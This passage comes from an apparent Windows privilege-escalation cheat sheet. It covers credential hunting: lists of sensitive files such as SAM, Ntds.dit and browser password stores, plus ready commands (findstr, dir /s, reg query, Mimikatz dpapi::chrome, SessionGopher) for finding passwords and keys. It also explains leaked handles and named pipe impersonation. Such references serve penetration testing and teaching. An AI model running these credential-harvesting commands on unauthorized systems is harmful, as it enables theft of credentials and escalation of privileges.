			* `hostapd.conf`
			* `rsyncd.conf`
			* `cesi.conf`
			* `supervisord.conf`
			* `tomcat-users.xml`
			* `*.kdbx`
			* `KeePass.config`
			* `Ntds.dit`
			* `SAM`
			* `SYSTEM`
			* `FreeSSHDservice.ini`
			* `access.log`
			* `error.log`
			* `server.xml`
			* `ConsoleHost_history.txt`
			* `setupinfo`
			* `setupinfo.bak`
			* `key3.db		 #Firefox`
			* `key4.db		 #Firefox`
			* `places.sqlite   #Firefox`
			* `"Login Data"	#Chrome`
			* `Cookies		 #Chrome`
			* `Bookmarks	   #Chrome`
			* `History		 #Chrome`
			* `TypedURLsTime   #IE`
			* `TypedURLs	   #IE`
			* `%SYSTEMDRIVE%\pagefile.sys`
			* `%WINDIR%\debug\NetSetup.log`
			* `%WINDIR%\repair\sam`
			* `%WINDIR%\repair\system`
			* `%WINDIR%\repair\software, %WINDIR%\repair\security`
			* `%WINDIR%\iis6.log`
			* `%WINDIR%\system32\config\AppEvent.Evt`
			* `%WINDIR%\system32\config\SecEvent.Evt`
			* `%WINDIR%\system32\config\default.sav`
			* `%WINDIR%\system32\config\security.sav`
			* `%WINDIR%\system32\config\software.sav`
			* `%WINDIR%\system32\config\system.sav`
			* `%WINDIR%\system32\CCM\logs\*.log`
			* `%USERPROFILE%\ntuser.dat`
			* `%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat`
	* <details><summary>Search all of the proposed files: (Click to expand)</summary><p>

			cd C:\
			dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
			Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
	* <details><summary>Credentials in the RecycleBin (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* nirsoft: Password Recovery Tools -<br />[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
		* <details><summary>Overview (Click to expand)</summary><p>
			* You should also check the Bin to look for credentials inside it
			* To recover passwords saved by several programs you can use: 
	* <details><summary>Inside the registry (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* ropnop blog: Extracting SSH Private Keys from Windows 10 SSH Agent -<br />[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
		* Other possible registry keys with credentials

				reg query "HKCU\Software\ORL\WinVNC3\Password"
				reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
				reg query "HKCU\Software\TightVNC\Server"
				reg query "HKCU\Software\OpenSSH\Agent\Key"
	* <details><summary>Browsers History (Click to expand)</summary><p>
		* You should check for dbs where passwords from Chrome or Firefox are stored.
		* Also check for the history, bookmarks and favourites of the browsers so maybe some passwords are stored there.
		* Browser Password Extraction Tools
			* Mimikatz

					dpapi::chrome
			* SharpWeb [https://github.com/djhohnstein/SharpWeb](https://github.com/djhohnstein/SharpWeb)
	* <details><summary>Generic Password search in files and registry (Click to expand)</summary><p>
		* Search all file contents for "password"
			* Command Shell

					cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
					findstr /si password *.xml *.ini *.txt *.config
					findstr /spin "password" *.*
		* Search for a file with a certain filename

				dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
				where /R C:\ user.txt
				where /R C:\ *.ini
		* Search the registry for key names and passwords

				REG QUERY HKLM /F "password" /t REG_SZ /S /K
				REG QUERY HKCU /F "password" /t REG_SZ /S /K
				REG QUERY HKLM /F "password" /t REG_SZ /S /d
				REG QUERY HKCU /F "password" /t REG_SZ /S /d
	* <details><summary>Tools that search for passwords (Click to expand)</summary><p>
		* MSF Credentials -<br />[https://github.com/carlospolop/MSF-Credentials](https://github.com/carlospolop/MSF-Credentials)
			* MSF plugin that automatically executes every metasploit POST module that searches for credentials on the target
	 	* PEASS -<br />[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
	 		* Tool to automatically search for all the files containing passwords
	 		* LaZagne -<br />[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)
	 			* Tool to extract password from a system.
			* SessionGopher -<br />[https://github.com/Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher)
				* The tool searches for sessions, usernames and passwords of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)

						Import-Module path\to\SessionGopher.ps1;
						Invoke-SessionGopher -Thorough
						Invoke-SessionGopher -AllDomain -o
						Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
* <details><summary>Leaked Handlers (Click to expand)</summary><p>
	* <details><summary>References (Click to expand)</summary><p>
		* HackTricks -<br />[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/leaked-handle-exploitation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/leaked-handle-exploitation)
		* dronesec.pw: "Exploiting Leaked Process and Thread Handles" -<br />[http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)
	* Vulnerability Overview
		* A process running as SYSTEM open a new process (`OpenProcess()`) with full access. The same process also create a new process (`CreateProcess()`) with low privileges but inheriting all the open handles of the main process.
		* An attacker with access to the low privileged process can grab the open handle to the privileged process created with `OpenProcess()` and inject a shellcode.
	* Attacks
		* Option 1: Attacker discovers binary
		* Option 2: Attacker identifies vulnerable process's PID
* <details><summary>Named Pipe Client Impersonation (Click to expand)</summary><p>
	 * <details><summary>References (Click to expand)</summary><p>
	 	* HackTricks: Named Pipe Client Impersonation -<br />[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/named-pipe-client-impersonation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/named-pipe-client-impersonation)
	 * <details><summary>Overview (Click to expand)</summary><p>
		* A pipe is a block of shared memory that processes can use for communication and data exchange.
		* Named Pipes is a Windows mechanism that enables two unrelated processes to exchange data between themselves, even if the processes are located on two different networks. It's very similar to client/server architecture as notions such as a named pipe server and a named pipe client exist.
		* When a client writes on a pipe, the server that created the pipe can impersonate the client if it has SeImpersonate privileges. Then, if you can find a privileged process that is going to write on any pipe that you can impersonate, you could be able to escalate privileges impersonating that process after it writes inside your created pipe. 


### Post-Enumeration

* Search for exploits that affect the kernel
	* Google
	* searchsploit
	* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
	* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
